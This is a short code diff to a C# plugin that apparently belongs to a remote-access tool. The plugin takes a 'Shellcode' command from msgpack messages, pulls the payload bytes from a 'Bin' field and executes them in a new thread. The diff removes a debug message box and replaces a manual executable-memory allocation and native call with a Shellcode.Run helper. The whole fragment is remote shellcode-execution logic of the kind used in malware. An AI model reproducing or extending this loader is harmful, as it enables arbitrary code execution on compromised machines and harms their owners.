@@ -71,7 +71,6 @@ namespace Plugin
                     case "Shellcode":
                         {
                             bin = unpack_msgpack.ForcePathObject("Bin").GetAsBytes();
-                            MessageBox.Show(Convert.ToBase64String(bin));
                             ThreadStart threadStart = new ThreadStart(RunShellcode);
                             Thread thread = new Thread(threadStart);
                             thread.Start();
@@ -88,9 +87,7 @@ namespace Plugin
 
         public static void RunShellcode()
         {
-            IntPtr shellcode = NativeCaller.AllocateExecutableCode(IntPtr.Zero, bin);
-
-            NativeCaller.Call(shellcode);
+            Shellcode.Run(bin,true);
         }
 
         public static byte[] bin { get; set; }
